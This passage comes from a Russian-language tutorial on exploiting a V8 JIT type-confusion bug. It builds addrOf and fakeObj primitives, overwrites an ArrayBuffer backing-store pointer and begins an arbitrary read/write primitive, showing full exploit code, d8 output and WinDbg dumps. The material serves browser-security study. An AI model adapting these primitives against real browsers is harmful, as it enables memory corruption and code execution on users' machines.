obj.inline;\n      // Принудительно выполняем Map Transition при помощи нашего побочного эффекта\n      this.Object.create(obj);\n      // Запускаем type confusion, получая доступ к свойствам за границами\n      ${pNames.map((p) => `let ${p} = obj.${p};`).join('\\n')}\n      return [${pNames.join(', ')}];\n    }\n  `)\n\n    // Создаём массив отрицательных значений от -1 до -32, которые будут\n    // использовался для функции makeObj\n    let pValues = [];\n    for (let i = 1; i < 32; i++) {\n        pValues[i] = -i;\n    }\n\n    // JIT-код для запуска vuln\n    for (let i = 0; i < 10000; i++) {\n        // Создаём объект и передаём его функции Vuln\n        let res = vuln(makeObj(pValues));\n        // Ищем пересекающиеся свойства в результатах\n        for (let i = 1; i < res.length; i++) {\n            // Если i не является тем же значением, и res[i] находится в интервале от -32 до 0, оно пересекается\n            if (i !== -res[i] && res[i] < 0 && res[i] > -32) {\n                [p1, p2] = [i, -res[i]];\n                return;\n            }\n        }\n    }\n    throw \"[!] Failed to find overlapping properties\";\n}\n\nfunction addrOf() {\n    eval(`\n    function vuln(obj) {\n      obj.inline;\n      this.Object.create(obj);\n      // Запускаем type confusion, выполняя доступ к свойству за границами\n        // Это загрузит p1 из нашего объекта, думая, что это Double, но\n        // вместо этого из-за пересечения это загрузит p2, которое является объектом\n      return obj.p${p1}.x;\n    }\n  `);\n\n    let obj = {z: 1234};\n    let pValues = [];\n    pValues[p1] = {x: 13.37};\n    pValues[p2] = {y: obj};\n\n    for (let i = 0; i < 10000; i++) {\n        let res = vuln(makeObj(pValues));\n        if (res != 13.37) {\n            %DebugPrint(obj);\n            return res;\n        }\n    }\n    throw \"[!] AddrOf Primitive Failed\"\n}\n\nprint(\"[+] Finding Overlapping Properties...\");\nfindOverlappingProperties();\nprint(`[+] Properties p${p1} and p${p2} overlap!`);\nlet x = addrOf();\nprint(\"[+] Leaking Object Address...\");\nprint(`[+] Object Address: ${x}`);\n\r\nСделав это, можно исполнить дополненный скрипт в d8 и получить схожий результат:\n\r\n\n\r\n\nC:\\dev\\v8\\v8\\out\\x64.debug>d8 --allow-natives-syntax C:\\Users\\User\\Desktop\\poc.js\n[+] Finding Overlapping Properties...\n[+] Properties p6 and p7 overlap!\nDebugPrint: 000001E72E81A369: [JS_OBJECT_TYPE] in OldSpace\n - map: 0x005245541631 <Map(HOLEY_ELEMENTS)> [FastProperties]\n - prototype: 0x00bfad784229 <Object map = 00000052455022F1>\n - elements: 0x0308c8602cf1 <FixedArray[0]> [HOLEY_ELEMENTS]\n - properties: 0x0308c8602cf1 <FixedArray[0]> {\n    #z: 1234 (data field 0)\n }\n0000005245541631: [Map]\n - type: JS_OBJECT_TYPE\n - instance size: 32\n - inobject properties: 1\n - elements kind: HOLEY_ELEMENTS\n - unused property fields: 0\n - enum length: invalid\n - stable_map\n - back pointer: 0x00524550c201 <Map(HOLEY_ELEMENTS)>\n - prototype_validity cell: 0x0379e0b82201 <Cell value= 1>\n - instance descriptors (own) #1: 0x01e72e80f339 <DescriptorArray[5]>\n - layout descriptor: 0000000000000000\n - prototype: 0x00bfad784229 <Object map = 00000052455022F1>\n - constructor: 0x00bfad784261 <JSFunction Object (sfi = 00000379E0B8ED51)>\n - dependent code: 0x0308c8602391 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>\n - construction counter: 0\n\n[+] Leaking Object Address...\n[+] Object Address: 1.033797443889e-311\n\r\nКак видите, функция \naddrOf\n возвратила значение double с плавающей запятой! Теперь нужно преобразовать это значение в реальный адрес, чтобы мы могли убедиться в его корректности.\n\r\n\n\r\nДля этого можно использовать \nTypedArray\n, которые позволяют описывать массивоподобные структуры внутреннего \nбуфера двоичных данных\n. Так как возвращаемые данные являются значением с плавающей запятой двойной точности, можно использовать \nFloat64Array\n, чтобы сохранить double в двоичном формате следующим образом:\n\r\n\n\r\n\nd8> let floatView = new Float64Array(1);\nd8> floatView[0] = 1.033797443889e-311\n\r\nСделав это, мы можем преобразовать буфер \nfloatView\n в 64-битное беззнаковое integer при помощи \nBigUint64Array\n, что даст нам байтовое представление адреса объекта.\n\r\n\n\r\n\nd8> let uint64View = new BigUint64Array(floatView.buffer);\nd8> uint64View[0]\n2092429321065n\n\r\nПосле этого достаточно использовать функцию \ntoString\n по основанию 16, чтобы преобразовать байты в шестнадцатеричный вид, что должно дать нам действительный адрес.\n\r\n\n\r\n\nd8> uint64View[0].toString(16)\n\"1e72e81a369\"\n\r\nКак мы видим, после преобразования байтов в шестнадцатеричный вид значение, утёкшее благодаря примитиву \naddrOf\n, соответствует адресу объекта, то есть \n000001E72E81A369\n!\n\r\n\n\r\nИтак, теперь у нас есть работающий примитив \naddrOf\n!\n\r\n\n\r\nДалее достаточно всего лишь внести небольшое изменение в функцию \naddrOf\n. Нужно вычесть \n1n\n из \nBigUint64Array\n, чтобы учесть маркировку указателей, если мы хотим использовать этот адрес дальше в скрипте.\n\r\n\n\r\nФункция \naddrOf\n с буферами преобразований теперь выглядит так:\n\r\n\n\r\n\n// Буферы преобразований\nlet floatView = new Float64Array(1);\nlet uint64View = new BigUint64Array(floatView.buffer);\n\nNumber.prototype.toBigInt = function toBigInt() {\n    floatView[0] = this;\n    return uint64View[0];\n};\n\n...\n\nfunction addrOf() {\n    eval(`\n    function vuln(obj) {\n      obj.inline;\n      this.Object.create(obj);\n      // Запускаем type confusion, выполняя доступ к свойству за границами\n        // Это загрузит p1 из нашего объекта, которое считается Double, но\n        // вместо этого из-за пересечения это загрузит p2, которое является объектом\n      return obj.p${p1}.x;\n    }\n  `);\n\n    let obj = {z: 1234};\n    let pValues = [];\n    pValues[p1] = {x: 13.37};\n    pValues[p2] = {y: obj};\n\n    for (let i = 0; i < 10000; i++) {\n        let res = vuln(makeObj(pValues));\n        if (res != 13.37) {\n            // Вычитаем из адреса 1n из-за маркировки указателей.\n            return res.toBigInt() - 1n;\n        }\n    }\n    throw \"[!] AddrOf Primitive Failed\"\n}\n\r\n\nПримитив записи fakeObj\n\r\nПримитив \nfakeObj\n (сокращение от «Fake Object») позволяет нам записывать данные в фальшивый объект при помощи эксплойтинга созданной нами type confusion. По сути, примитив записи просто обратен примитиву \naddrOf\n.\n\r\n\n\r\nДля создания функции \nfakeObj\n мы просто вносим небольшое изменение в исходную функцию \naddrOf\n. В функции \nfakeObj\n мы будем сохранять исходное значение объекта в переменную \norig\n. После её перезаписи мы возвращаем исходное значение и сравниваем его в JIT-функции.\n\r\n\n\r\nДля тестирования мы попробуем переписать свойство \nx\n в \np1\n значением double \n0x41414141n\n. Когда в JIT-коде сработает баг, из-за type confusion это перепишет свойство \ny\n в \np2\n. Если нам успешно удастся повредить значение и позже вернуть её при помощи параметра \norig\n, оно больше не будет равно 13.37.\n\r\n\n\r\nФункция \nfakeObj\n будет выглядеть так:\n\r\n\n\r\n\nfunction fakeObj() {\n    eval(`\n    function vuln(obj) {\n      obj.inline;\n      this.Object.create(obj);\n      let orig = obj.p${p1}.x;\n      // Перезаписываем свойство x в p1, но из-за type confusion\n      // мы перезаписываем свойство y в p2\n      obj.p${p1}.x = 0x41414141n;\n      return orig;\n    }\n  `);\n\n    let obj = {z: 1234};\n    let pValues = [];\n    pValues[p1] = {x: 13.37};\n    pValues[p2] = {y: obj};\n\n    for (let i = 0; i < 10000; i++) {\n        let res = vuln(makeObj(pValues));\n        if (res != 13.37) {\n            return res;\n        }\n    }\n}\n\r\nДополнив наш код новым примитивом \nfakeObj\n и выполнив его в d8, мы должны получить похожий вывод:\n\r\n\n\r\n\nC:\\dev\\v8\\v8\\out\\x64.debug>d8 --allow-natives-syntax C:\\Users\\User\\Desktop\\poc.js\n[+] Finding Overlapping Properties...\n[+] Properties p6 and p30 overlap!\n[+] Leaking Object Address...\n[+] Object Address: 0x21eacf99a08\n[+] Corrupting Object Address...\n[+] Leaked Data: 1094795585\n\r\nПохоже, мы получили какие-то данные, но они не равны 13.37!\n\r\n\n\r\nОни похожи на беззнаковый integer, поэтому мы можем использовать буфер массива \nuint64View\n для сохранения значения, а затем преобразовать байты в шестнадцатеричные значения.\n\r\n\n\r\n\nd8> uint64View[0] = 1094795585n\nd8> uint64View[0].toString(16)\n'41414141'\n\r\nВот и всё! Мы успешно перезаписали свойство \ny\n в \np2\n и успешно создали действующий примитив записи!\n\r\n\n\r\nЭто очень мощный примитив, ведь, по сути, он позволяет нам выполнять запись в любое свойство объекта, адрес которого мы можем найти. Исходя из этого, мы можем начать создавать более сложные примитивы эксплойтов, чтобы в конечном итоге добиться исполнения кода.\n\r\n\n\r\n\nПолучаем возможность чтения + записи памяти\n\r\nСоздав на основе бага работающие примитивы чтения и записи, мы можем использовать эти примитивы для получения возможности удалённого исполнения кода в интерпретаторе. На данный момент мы можем только перезаписывать свойство второго объекта контролируемым double. Однако для нас это совершенно бесполезно.\n\r\n\n\r\nПричина в том, что даже несмотря на то, что мы можем перезаписывать адрес объекта в свойстве, если попытаться получить доступ к этому адресу для записи данных, то V8 всё равно попытается разыменовать его и получать доступ к указателю хранилища по смещению 8 от этого адреса. Это усложняет чтение или запись в любой выбранный нами адрес.\n\r\n\n\r\nЧтобы достичь чего-то полезного на основе наших примитивов чтения и записи, нам нужно перезаписать внутреннее поле объекта, например, указатель хранилища, а не сам объект или свойство в хранилище. Как вы знаете, указатель хранилища содержит адрес памяти, сообщающий V8, где расположено наше свойство или массив элементов. Если мы сможем перезаписать этот указатель, то сможем при помощи бага приказывать V8 получать доступ к конкретным элементам в памяти!\n\r\n\n\r\nДалее для реализации этого эксплойта нам нужно решить, какой тип объекта мы хотим использовать при повреждении указателя хранилища. Разумеется, мы можем использовать простой объект с внешними свойствами, однако в нашем случае, да и в случае большинства эксплойтов браузеров, используется объект \nArrayBuffer\n.\n\r\n\n\r\nМы используем \nArrayBuffer\n вместо обычного объекта потому, что эти буферы массива используются для описания буфера сырых двоичных данных фиксированного размера. Здесь важно отметить, что мы не можем напрямую манипулировать содержимым \nArrayBuffer\n через JavaScript. Поэтому необходимо использовать объект \nTypedArray\n или \nDataView\n с определённым форматом представления данных для чтения и записи содержимого буфера.\n\r\n\n\r\nРанее мы использовали \nTypedArray\n в примитиве \naddrOf\n для возврата адреса объекта в виде double с плавающей запятой, а затем преобразовывали его в беззнаковый 64-битный integer, что позволило нам преобразовать это значение в шестнадцатеричный вид, чтобы узнать реальный адрес. Мы можем применить тот же принцип к примитиву \nfakeObj\n, указав тип данных, с которым хотим работать, например, integer, floats, 64-битные integer и так далее. Благодаря этому мы сможем с лёгкостью считывать и записывать данные любого нужного нам типа, не особо беспокоясь о преобразованиях или типе значений, которые имеют свойства.\n\r\n\n\r\nПрежде чем двигаться дальше, давайте посмотрим, как объекты \nArrayBuffer\n выглядят в памяти, чтобы лучше понять, как их эксплойтить.\n\r\n\n\r\nДля начала создадим новый \nArrayBuffer\n, имеющий длину 8 байтов, а затем присвоим этому буферу беззнаковую 8-битную view.\n\r\n\n\r\n\nd8> var buffer = new ArrayBuffer(8)\nd8> var view = new Uint8Array(buffer)\n\r\nТеперь используем команду \n%DebugPrint\n для изучения объекта буфера.\n\r\n\n\r\n\nd8> %DebugPrint(buffer)\nDebugPrint: 000002297C70D881: [JSArrayBuffer]\n - map: 0x03b586384371 <Map(HOLEY_ELEMENTS)> [FastProperties]\n - prototype: 0x032f41990b21 <Object map = 000003B5863843C1>\n - elements: 0x01d0a7902cf1 <FixedArray[0]> [HOLEY_ELEMENTS]\n - embedder fields: 2\n - backing_store: 00000286692101A0\n - byte_length: 8\n - neuterable\n - properties: 0x01d0a7902cf1 <FixedArray[0]> {}\n - embedder fields = {\n    0000000000000000\n    0000000000000000\n }\n\r\nКак видите, объект \nArrayBuffer\n похож на другие объекты V8: у него есть Map, свойства, фиксированный массив элементов, а также необходимые свойства самого буфера массива, например, длина в байтах и его \nхранилище\n. Хранилище — это адрес, по которому TypedArray (в нашем случае переменная \nview\n) считывает и записывает данные.\n\r\n\n\r\nМы можем убедиться в связи между \nArrayBuffer\n и \nTypedArray\n, использовав функцию \n%DebugPrint\n с переменной \nview\n.\n\r\n\n\r\n\nd8> %DebugPrint(view)\nDebugPrint: 000002297C70F791: [JSTypedArray]\n - map: 0x03b586382b11 <Map(UINT8_ELEMENTS)> [FastProperties]\n - prototype: 0x032f419879e1 <Object map = 000003B586382B61>\n - elements: 0x02297c70f7d9 <FixedUint8Array[8]> [UINT8_ELEMENTS]\n - embedder fields: 2\n - buffer: 0x02297c70d881 <ArrayBuffer map = 000003B586384371>\n - byte_offset: 0\n - byte_length: 8\n - length: 8\n - properties: 0x01d0a7902cf1 <FixedArray[0]> {}\n - elements: 0x02297c70f7d9 <FixedUint8Array[8]> {\n         0-7: 0\n }\n - embedder fields = {\n    0000000000000000\n    0000000000000000\n }\n\r\nКак видите, \nTypedArray\n имеет свойство \nbuffer\n, указывающее на \nArrayBuffer\n по адресу \n0x02297c70d881\n. \nTypedArray\n также наследует свойство длинны в байтах от родительского \nArrayBuffer\n, чтобы знать, сколько данных он может читать и записывать с его конкретным форматом данных.\n\r\n\n\r\nЧтобы лучше разобраться в структуре и хранилище объекта буфера массива, можно воспользоваться WinDbg.\n\r\n\n\r\n\n0:005> dq 000002297C70D881-1 L6\n00000229`7c70d880  000003b5`86384371 000001d0`a7902cf1\n00000229`7c70d890  000001d0`a7902cf1 00000000`00000008\n00000229`7c70d8a0  00000286`692101a0 00000000`00000002\n\r\nМы видим, что в левом верхнем углу находятся Map, свойства и указатели хранилища свойств массива элементов. За ними следует длина в байтах, после чего указатель хранилища адреса \n00000286692101A0\n, который находится по смещению 32 от начала буфера массива.\n\r\n\n\r\nПрежде чем изучать буфер хранилища, добавим данные в буфер, чтобы лучше понимать представление в памяти. Чтобы записать данные в \nArrayBuffer\n, нужно использовать \nTypedArray\n при помощи переменной \nview\n.\n\r\n\n\r\n\nd8> view[0] = 65\nd8> view[2] = 66\n\r\nТеперь просмотрим это хранилище в WinDbg. Стоит отметить, что я не вычитаю 1 из указателя, поскольку в отличие от хранилищ других объектов хранилище \nArrayBuffer\n является 64-битным указателем!\n\r\n\n\r\n\n0:005> dq 00000286692101A0 L6\n00000286`692101a0  00000000`00420041 dddddddd`fdfdfdfd\n00000286`692101b0  00000000`dddddddd 8c003200`1f678a43\n00000286`692101c0  00000286`69d34e50 00000286`69d40230\n\r\nИзучив этот адрес памяти, мы заметим, что в левой верхней части находятся 8 байтов данных, которые мы распределили для буфера массива. Справа, по индексу 0 находится \n0x41\n, то есть 65, а по индексу 2 находится \n0x42\n, то есть 66.\n\r\n\n\r\nКак видите, использование \nArrayBuffer\n с \nTypedArray\n любого типа данных позволяет нам контролировать то, где мы можем читать и записывать данные, если у нас есть контроль над указателем хранилища!\n\r\n\n\r\nПомня об этом, давайте разберёмся, как получить доступ к этому указателю хранилища при помощи примитива \nfakeObj\n, чтобы перезаписать его. Пока для примитивов чтения и записи мы создавали объект для \np1\n с одним внутренним свойством и объект для \np2\n, тоже имевший одно внутреннее свойство.\n\r\n\n\r\n\nfunction fakeObj() {\n    eval(`\n    function vuln(obj) {\n      obj.inline;\n      this.Object.create(obj);\n      let orig = obj.p${p1}.x;\n      // Перезаписываем свойство x в p1, но из-за type confusion\n      // перезаписывается свойство y в p2\n      obj.p${p1}.x = 0x41414141n;\n      return orig;\n    }\n  `);\n\n    let obj = {z: 1234};\n    let pValues = [];\n    pValues[p1] = {x: 13.37};\n    pValues[p2] = {y: obj}\n\t...\n\r\nВ функции \nvuln\n мы пытаемся перезаписать свойство \nx\n объекта \np1\n. Это разыменует адрес объекта для \np1\n и выполнит доступ по смещению 24, где внутренним образом хранится значение свойства \nx\n. Однако из-за type confusion эта операция на самом деле разыменует адрес объекта \np2\n и выполнит доступ по смещению 24, где внутренним образом хранится свойство \ny\n, что позволит нам перезаписать адрес объекта \nobj\n.\n\r\n\n\r\nВ примере ниже показано, как это будет выглядеть в памяти.\n\r\n\n\r\n\n\r\nМы знаем, что указатель хранилища для буфера массива находится по смещению 32, то есть если мы создадим ещё одно внутреннее свойство, например, \nx2\n, то сможем получить доступ к указателю хранилища и перезаписать его при помощи примитива \nfakeObj\n!\n\r\n\n\r\nВ примере ниже показано, как этот процесс выглядит в памяти.\n\r\n\n\r\n\n\r\nЭто замечательно! Ведь это позволяет нам, наконец, использовать баг и примитивы для получения доступа с целью чтения/записи произвольной памяти. Однако есть одна небольшая проблема. Рассмотрим ситуацию: если нам нужно выполнять запись или чтение из нескольких участков памяти, то нам придётся постоянно выполнять баг и перезаписывать хранилище буфера массива при помощи примитива \nfakeObj\n, что утомительно. Поэтому нам нужно решение получше.\n\r\n\n\r\nЧтобы минимизировать количество случаев, когда нам необходимо использовать примитив \nfakeObj\n для перезаписи хранилища, можно воспользоваться двумя объектами буфера массива вместо одного. Таким образом мы сможем повредить указатель хранилища первого буфера массива и сделать так, чтобы он указывал на адрес объекта второго буфера массива.\n\r\n\n\r\nСделав это, мы сможем использовать view \nTypedArray\n первого буфера массива для записи в четвёртый индекс, что перезапишет указатель хранилища второго буфера массива. Далее мы сможем использовать view \nTypedArray\n второго буфера массива для чтения и записи данных в указываемую область памяти!\n\r\n\n\r\nИспользовав эти два буфера массива вместе, мы можем создать ещё один примитив эксплойта, позволяющий быстро выполнять чтение и запись данных в любой тип и любое место в куче V8.\n\r\n\n\r\nНиже показан пример того, как это будет выглядеть в памяти.\n\r\n\n\r\n\n\r\nЧтобы сделать функцию \nfakeObj\n более гибкой, мы изменим её так, чтобы она принимала любой выбранный нами объект. Также мы будем передавать ей параметр \nnewValue\n, определяющий данные, которые мы хотим записать. Затем мы присвоим этому параметру \nnewValue\n свойство \nx\n в функции \nvuln\n, чтобы не использовать жёстко прописанный адрес \n0x41414141n\n.\n\r\n\n\r\n\nfunction fakeObj(obj, newValue) {\n    eval(`\n    function vuln(obj) {\n      obj.inline;\n      this.Object.create(obj);\n      let orig = obj.p${p1}.x;\n      obj.p${p1}.x = $(newValue);\n      return orig;\n    }\n  `);\n\n    let pValues = [];\n    pValues[p1] = {x: 13.37};\n    pValues[p2] = {y: obj};\n\t...\n\r\nТакже мы изменим объект в \np1\n, чтобы он имел два внутренних свойства, поскольку мы знаем, что второе внутреннее свойство пересекается с указателем хранилища. Кроме того, нам нужно модифицировать функцию \nvuln\n, чтобы она получала доступ ко второму внутреннему свойств, и мы могли выполнять запись в указатель хранилища.\n\r\n\n\r\n\nBigInt.prototype.toNumber = function toNumber() {\n    uint64View[0] = this;\n    return floatView[0];\n};\n\nfunction fakeObj(obj, newValue) {\n    eval(`\n    function vuln(obj) {\n      obj.inline;\n      this.Object.create(obj);\n      // Выполняем запись в указатель хранилища при помощи свойства x2\n      let orig = obj.p${p1}.x2;\n      obj.p${p1}.x2 = ${newValue};\n      return orig;\n    }\n  `);\n\n    let pValues = [];\n    // Свойство x2 пересекается с указателем хранилища буфера массива\n    let o = {x1: 13.37, x2: 13.38};\n    pValues[p1] = o;\n    pValues[p2] = obj;\n\t...\n\r\nОбратите внимание, что для пересекающегося объекта \np2\n мы задали его непосредственно передаваемому \nobj\n. Мы сделали так, потому что нам нужно получать доступ к смещению 32 этого конкретного объекта, а не передавать объект как свойство.\n\r\n\n\r\nЧтобы правильно преобразовать передаваемые адрес или данные, мы добавим новую функцию преобразования \ntoNumber\n и будем вызывать её с параметром \nnewValue\n. Эта функция необходима, поскольку нам нужно преобразовывать передаваемый адрес или данные так, чтобы они были float. Причина этого в созданной нами type confusion и в том, что \np1\n ожидает float.\n\r\n\n\r\n\nBigInt.prototype.toNumber = function toNumber() {\n    uint64View[0] = this;\n    return floatView[0];\n};\n\nfunction fakeObj(obj, newValue) {\n    eval(`\n    function vuln(obj) {\n      obj.inline;\n      this.Object.create(obj);\n      // Выполняем запись в указатель хранилища при помощи свойства x2\n      let orig = obj.p${p1}.x2;\n      obj.p${p1}.x2 = ${newValue.toNumber()};\n      return orig;\n    }\n  `);\n\n    let pValues = [];\n    // Свойство x2 пересекается с указателем хранилища буфера массива\n    let o = {x1: 13.37, x2: 13.38};\n    pValues[p1] = o;\n    pValues[p2] = obj;\n\t...\n}\n\r\n\nА теперь важная часть:\n мы должны изменить цикл JIT, чтобы выполнить баг и перезаписать указатель хранилища. Как и в предыдущем цикле \nfakeObj\n, нам нужно внести лишь незначительные изменения.\n\r\n\n\r\nВо-первых, обратите внимание, что мы присвоили свойство \np1\n только что созданному объекту \no\n с двумя внутренними свойствами. Мы делаем это, потому что в цикле JIT нам понадобится постоянно задавать атрибут второго внутреннего свойства \no\n, чтобы принуждать JIT-компилятор использовать устранение избыточности для Map. Это позволит нам получать доступ к указателю хранилища как к float. Если этого не сделать, то функция не заработает!\n\r\n\n\r\nВо-вторых, в цикле JIT мы больше не будем сравнивать значение результата с 13.37. Вместо этого мы будем сравнивать его со значением второго свойства. В этом случае, если цикл больше не возвращает 13.38, это значит, что мы успешно выполнили баг и перезаписали указатель хранилища!\n\r\n\n\r\nОкончательная версия примитива \nfakeObj\n будет выглядеть следующим образом:\n\r\n\n\r\n\nBigInt.prototype.toNumber = function toNumber() {\n    uint64View[0] = this;\n    return floatView[0];\n};\n\nfunction fakeObj(obj, newValue) {\n    eval(`\n    function vuln(obj) {\n      obj.inline;\n      this.Object.create(obj);\n      // Выполняем запись в указатель хранилища при помощи свойства x2\n      let orig = obj.p${p1}.x2;\n      obj.p${p1}.x2 = ${newValue.toNumber()};\n      return orig;\n    }\n  `);\n\n    let pValues = [];\n    // Свойство x2 пересекается с указателем хранилища буфера массива\n    let o = {x1: 13.37,x2: 13.38};\n    pValues[p1] = o;\n    pValues[p2] = obj;\n\n    for (let i = 0; i < 10000; i++) {\n        // Принудительно вызываем Map Check и устранение избыточности\n        o.x2 = 13.38;\n        let res = vuln(makeObj(pValues));\n        if (res != 13.38) {\n            return res.toBigInt();\n        }\n    }\n    throw \"[!] fakeObj Primitive Failed\"\n}\n\r\nТак как мы используем для примитива объект \nfakeObj\n с двумя внутренними свойствами, давайте внесём то же изменение в примитив \naddrOf\n для обеспечения согласованности.\n\r\n\n\r\n\nfunction addrOf(obj) {\n    eval(`\n    function vuln(obj) {\n      obj.inline;\n      this.Object.create(obj);\n      // Запускаем type confusion, выполняя доступ к свойству за границами\n        // Это загрузит p1 из нашего объекта, думая, что это Double, но\n        // вместо этого из-за пересечения это загрузит p2, которое является объектом\n      return obj.p${p1}.x2;\n    }\n  `);\n\n    let pValues = [];\n    // Свойство x2 пересекается с указателем хранилища буфера массива\n    pValues[p1] = {x1: 13.37,x2: 13.38};\n    pValues[p2] = {y: obj};\n\n    for (let i = 0; i < 10000; i++) {\n        let res = vuln(makeObj(pValues));\n        if (res != 13.37) {\n            // Вычитаем 1n из адреса из-за маркировки указателей.\n            return res.toBigInt() - 1n;\n        }\n    }\n    throw \"[!] AddrOf Primitive Failed\"\n}\n\r\nМодифицировав скрипт эксплойта, мы сможем перезаписывать указатель хранилища буфера массива. Давайте протестируем это!\n\r\n\n\r\nДля начала нужно изменить код эксплойта, создав новый буфер массива с 1024 байтами данных. Затем мы попытаемся обеспечить утечку адреса буфера массива и перезаписать указатель хранилища значением \n0x41414141\n.\n\r\n\n\r\nОбратите внимание, что я добавил две функции \n%DebugPrint\n, чтобы убедиться, что адреса, утечку которых мы выполняем, совпадают с нашим объектом буфера массива, и что мы успешно перезаписали указатель хранилища буфера массива.\n\r\n\n\r\nНовый код в конце скрипта должен выглядеть примерно как мой:\n\r\n\n\r\n\nprint(\"[+] Finding Overlapping Properties...\");\nfindOverlappingProperties();\nprint(`[+] Properties p${p1} and p${p2} overlap!`);\n\n// Создаём буфер массива\nlet arrBuf1 = new ArrayBuffer(1024);\n\nprint(\"[+] Leaking ArrayBuffer Address...\");\nlet arrBuf1fAddr = addrOf(arrBuf1);\nprint(`[+] ArrayBuffer Address: 0x${arrBuf1fAddr.toString(16)}`);\n%DebugPrint(arrBuf1)\n\nprint(\"[+] Corrupting ArrayBuffer Backing Store Address...\")\n// Перезаписываем указатель хранилища значением 0x41414141\nlet ret = fakeObj(arrBuf1, 0x41414141n);\nprint(`[+] Original Leaked Data: 0x${ret.toString(16)}`);\n%DebugPrint(arrBuf1)\n\r\nПосле исполнения обновлённого скрипта эксплойта в d8 мы получим следующий вывод:\n\r\n\n\r\n\nC:\\dev\\v8\\v8\\out\\x64.debug>d8 --allow-natives-syntax C:\\Users\\User\\Desktop\\poc.js\n[+] Finding Overlapping Properties...\n[+] Properties p15 and p11 overlap!\n[+] Leaking ArrayBuffer Address...\n[+] ArrayBuffer Address: 0x2a164919360\nDebugPrint: 000002A164919361: [JSArrayBuffer] in OldSpace\n - map: 0x00f4b4a84371 <Map(HOLEY_ELEMENTS)> [FastProperties]\n - prototype: 0x0143f1990b21 <Object map = 000000F4B4A843C1>\n - elements: 0x029264b02cf1 <FixedArray[0]> [HOLEY_ELEMENTS]\n - embedder fields: 2\n - backing_store: 000001AEDA203210\n - byte_length: 1024\n - neuterable\n - properties: 0x029264b02cf1 <FixedArray[0]> {}\n - embedder fields = {\n    0000000000000000\n    0000000000000000\n }\n...\n\n[+] Corrupting ArrayBuffer Backing Store Address...\n[+] Original Leaked Data: 0x1aeda203210\nDebugPrint: 000002A164919361: [JSArrayBuffer] in OldSpace\n - map: 0x00f4b4a84371 <Map(HOLEY_ELEMENTS)> [FastProperties]\n - prototype: 0x0143f1990b21 <Object map = 000000F4B4A843C1>\n - elements: 0x029264b02cf1 <FixedArray[0]> [HOLEY_ELEMENTS]\n - embedder fields: 2\n - backing_store: 0000000041414141\n - byte_length: 1024\n - neuterable\n - properties: 0x029264b02cf1 <FixedArray[0]> {}\n - embedder fields = {\n    0000000000000000\n    0000000000000000\n }\n...\n\r\nКак видите, наш скрипт эксплойта позволяет успешно выполнять утечку адреса буфера массива, и мы убедились, что в отладочном выводе адреса совпадают. Также мы видим, что исходные утёкшие данные, или \nret\n, возвращают исходный адрес хранилища. Кроме того, мы успешно перезаписали указатель хранилища значением \n0x41414141\n, как показано в отладочном выводе!\n\r\n\n\r\nИмея возможность перезаписи указателя хранилища, мы можем двигаться дальше и продолжить писать эксплойт, создавая примитив чтения/записи памяти при помощи двух буферов массива. Напомню, что нам нужно создать два буфера массива, обеспечить утечку адреса второго буфера массива и перезаписать указатель хранилища первого буфера адресом второго буфера.\n\r\n\n\r\nВыполняющий эту задачу код показан ниже.\n\r\n\n\r\n\nprint(\"[+] Finding Overlapping Properties...\");\nfindOverlappingProperties();\nprint(`[+] Properties p${p1} and p${p2} overlap!`);\n\n// Создаём буферы массива\nlet arrBuf1 = new ArrayBuffer(1024);\nlet arrBuf2 = new ArrayBuffer(1024);\n\n// Выполняем утечку адреса arrBuf2\nprint(\"[+] Leaking ArrayBuffer Address...\");\nlet arrBuf2fAddr = addrOf(arrBuf2);\nprint(`[+] ArrayBuffer Address: 0x${arrBuf2fAddr.toString(16)}`);\n\n// Повреждаем указатель хранилища arrBuf1 при помощи адреса arrBuf2\nprint(\"[+] Corrupting ArrayBuffer Backing Store Address...\")\nlet originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2fAddr);\n\r\nСделав это, мы сможем перезаписывать указатель хранилища \narrBuf1\n так, чтобы он указывал на объект \narrBuf2\n. Для этого можно создать \nTypedArray\n для первого буфера массива и считывать указатель хранилища, используя беззнаковый 64-битный integer при помощи \nBigUint64Array\n. Это должно дать нам байтовое представление адреса второго буфера массива.\n\r\n\n\r\nДополненный код будет выглядеть так:\n\r\n\n\r\n\nprint(\"[+] Finding Overlapping Properties...\");\nfindOverlappingProperties();\nprint(`[+] Properties p${p1} and p${p2} overlap!`);\n\n// Создаём буферы массива\nlet arrBuf1 = new ArrayBuffer(1024);\nlet arrBuf2 = new ArrayBuffer(1024);\n\n// Выполняем утечку адреса arrBuf2\nprint(\"[+] Leaking ArrayBuffer Address...\");\nlet arrBuf2Addr = addrOf(arrBuf2);\nprint(`[+] ArrayBuffer Address: 0x${arrBuf2Addr.toString(16)}`);\n\n// Повреждаем указатель хранилища arrBuf1 при помощи адреса arrBuf2\nprint(\"[+] Corrupting ArrayBuffer Backing Store Address...\")\nlet originalArrBuf1BackingStore = fakeObj(arrBuf1, arrBuf2Addr);\n\n// Убеждаемся в перезаписи хранилища при помощи TypedArray\nlet view1 = new BigUint64Array(arrBuf1)\nlet originalArrBuf2BackingStore = view1[4]\nprint(`[+] ArrayBuffer Backing Store: 0x${originalArrBuf2BackingStore.toString(16)}`);\n%DebugPrint(arrBuf2)\n\r\nКак видите, в конце скрипта для подтверждения перезаписи мы используем \n%DebugPrint\n с объектом \narrBuf2\n, убеждаясь в том, что у нас есть правильный адрес хранилища.\n\r\n\n\r\nИсполнив этот код, мы получим следующий вывод:\n\r\n\n\r\n\nC:\\dev\\v8\\v8\\out\\x64.debug>d8 --allow-natives-syntax C:\\Users\\User\\Desktop\\poc.js\n[+] Finding Overlapping Properties...\n[+] Properties p6 and p15 overlap!\n[+] Leaking ArrayBuffer Address...\n[+] ArrayBuffer Address: 0x7393e19360\n[+] Corrupting ArrayBuffer Backing Store Address...\n[+] ArrayBuffer Backing Store: 0x15b14db9f20\nDebugPrint: 0000007393E19361: [JSArrayBuffer] in OldSpace\n - map: 0x00f8c4384371 <Map(HOLEY_ELEMENTS)> [FastProperties]\n - prototype: 0x0075a6d10b21 <Object map = 000000F8C43843C1>\n - elements: 0x00f30a102cf1 <FixedArray[0]> [HOLEY_ELEMENTS]\n - embedder fields: 2\n - backing_store: 0000015B14DB9F20\n - byte_length: 1024\n - neuterable\n - properties: 0x00f30a102cf1 <FixedArray[0]> {}\n - embedder fields = {\n    0000000000000000\n    0000000000000000\n }\n\r\nСработало! Как видно из вывода, мы успешно смогли выполнить утечку адреса второго буфера массива и считать его указатель хранилища, и они при этом совпадают. Далее мы можем продолжить создавать примитивы чтения и записи памяти при помощи 